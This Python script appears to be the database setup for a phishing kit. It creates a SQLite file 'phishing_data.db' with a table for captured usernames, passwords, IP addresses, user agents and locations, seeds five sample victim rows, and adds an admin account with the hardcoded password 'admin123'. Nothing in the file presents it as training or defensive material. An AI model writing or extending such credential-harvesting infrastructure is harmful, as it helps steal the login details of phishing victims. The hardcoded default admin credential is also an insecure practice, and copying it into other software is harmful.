import sqlite3
from datetime import datetime
import os

def initialize_database():
    
    db_exists = os.path.exists('phishing_data.db')
    
    
    conn = sqlite3.connect('phishing_data.db')
    c = conn.cursor()
    
   
    c.execute('''
        CREATE TABLE IF NOT EXISTS captured_data (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
            username TEXT,
            password TEXT,
            ip_address TEXT,
            user_agent TEXT,
            location TEXT
        )
    ''')
    
    c.execute('''
        CREATE TABLE IF NOT EXISTS admin_users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT UNIQUE,
            password TEXT
        )
    ''')
    
    
    c.execute('INSERT OR IGNORE INTO admin_users (username, password) VALUES (?, ?)',
             ('admin', 'admin123'))
    
    
    if not db_exists:
        sample_data = [
            (
                datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                f'user{i}',
                f'password{i}',
                f'192.168.1.{i}',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
                'Unknown'
            ) for i in range(1, 6)
        ]
        
        c.executemany('''
            INSERT INTO captured_data 
            (timestamp, username, password, ip_address, user_agent, location)
            VALUES (?, ?, ?, ?, ?, ?)
        ''', sample_data)
    
    
    conn.commit()
    conn.close()
    
    print("Database initialized successfully!")
    print("Default admin credentials:")
    print("Username: admin")
    print("Password: admin123")
    print("\nWarning: Please change these credentials after first login!")

if __name__ == "__main__":
    initialize_database() 